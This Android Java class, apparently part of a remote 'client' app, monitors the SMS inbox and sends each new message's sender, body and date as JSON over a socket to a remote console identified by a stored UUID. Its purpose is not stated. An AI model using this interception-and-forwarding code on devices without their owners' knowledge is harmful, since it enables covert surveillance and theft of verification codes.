package com.lsper.client.observer;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.graphics.Paint;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.text.TextUtils;
import android.util.Log;

import com.google.gson.Gson;
import com.lsper.client.ClientObjectKt;
import com.lsper.client.bean.Content;
import com.lsper.client.bean.Sms;

import org.slf4j.helpers.Util;

import java.util.Observable;

import kotlin.Unit;
import kotlin.time.DurationUnitKt;

import static androidx.core.content.ContextCompat.checkSelfPermission;

public class SmsObserver extends ContentObserver {
        // 只检查收件箱
        final private int REQUEST_CODE_ASK_PERMISSIONS = 123;
        public static final Uri MMSSMS_ALL_MESSAGE_URI = Uri.parse("content://sms/inbox");
        public static final String SORT_FIELD_STRING = "_id asc";  // 排序
        public static final String DB_FIELD_ID = "_id";
        public static final String DB_FIELD_ADDRESS = "address";
        public static final String DB_FIELD_PERSON = "person";
        public static final String DB_FIELD_BODY = "body";
        public static final String DB_FIELD_DATE = "date";
        public static final String DB_FIELD_TYPE = "type";
        public static final String DB_FIELD_THREAD_ID = "thread_id";
        public static final String[] ALL_DB_FIELD_NAME = {
                DB_FIELD_ID, DB_FIELD_ADDRESS, DB_FIELD_PERSON, DB_FIELD_BODY,
                DB_FIELD_DATE, DB_FIELD_TYPE, DB_FIELD_THREAD_ID };
        public static int mMessageCount = -1;

        private static final long DELTA_TIME = 60 * 1000;
        private final ContentResolver mResolver;
        private final Context context;
        public SmsObserver(ContentResolver mResolver, Handler handler,Context context) {
            super(handler);
            this.mResolver = mResolver;
            this.context = context;


        }

        @Override
        public void onChange(boolean selfChange) {
            onReceiveSms();
        }
        private void onReceiveSms() {




            Cursor cursor = null;
            // 添加异常捕捉
            try {

                cursor = mResolver.query(MMSSMS_ALL_MESSAGE_URI, ALL_DB_FIELD_NAME,
                        null, null, SORT_FIELD_STRING);
                final int count = cursor.getCount();
                if (count <= mMessageCount) {
                    mMessageCount = count;
                    return;
                }
                // 发现收件箱的短信总数目比之前大就认为是刚接收到新短信---如果出现意外，请神保佑
                // 同时认为id最大的那条记录为刚刚新加入的短信的id---这个大多数是这样的，发现不一样的情况的时候可能也要求神保佑了
                mMessageCount = count;
                if (cursor != null) {
                    cursor.moveToLast();
                    final long smsdate = Long.parseLong(cursor.getString(cursor.getColumnIndex(DB_FIELD_DATE)));
                    final long nowdate = System.currentTimeMillis();
                    // 如果当前时间和短信时间间隔超过60秒,认为这条短信无效
                    if (nowdate - smsdate > DELTA_TIME) {
                        return;
                    }
                    final String address = cursor.getString(cursor.getColumnIndex(DB_FIELD_ADDRESS));    // 短信号码
                    final String body = cursor.getString(cursor.getColumnIndex(DB_FIELD_BODY));          // 在这里获取短信信息
                    final String date = cursor.getString(cursor.getColumnIndex(DB_FIELD_DATE));
                    final int smsid = cursor.getInt(cursor.getColumnIndex(DB_FIELD_ID));
                    final String person = cursor.getString(cursor.getColumnIndex(DB_FIELD_PERSON));
                    if (TextUtils.isEmpty(address) || TextUtils.isEmpty(body)) {
                        return;
                    }
                    // 得到短信号码和内容之后进行相关处理
                    Log.e("sms","push");
                    Sms sms = new Sms();
                    if (person!=null){
                        sms.setPerson(person);
                    }
                    sms.setLateTime(Long.valueOf(date));
                    sms.setPhoneNumber(address);
                    sms.setSmsContent(body);


                    SharedPreferences sp = context.getSharedPreferences("UUID",Context.MODE_PRIVATE);
                    String recipientUUID =  sp.getString("consoleUUID",null);
                    String localUUID = sp.getString("localUUID",null);
                    if ((!recipientUUID.equals("")) && (!localUUID.equals(""))){
                        Content content = new Content();
                        content.setOrigin("client");
                        content.setRecipientUUID(recipientUUID);
                        content.setSenderUUID(localUUID);
                        content.setType("getSMS");

                        String jsonSMS = new Gson().toJson(sms);
                        content.setContent(jsonSMS);

                        String jsonContent = new Gson().toJson(content);
                        ClientObjectKt.socketClient.send(jsonContent);
                        Log.e("sms","pushEnd");


                    }






                }
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (cursor != null) {
                    try {  // 有可能cursor都没有创建成功
                        cursor.close();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }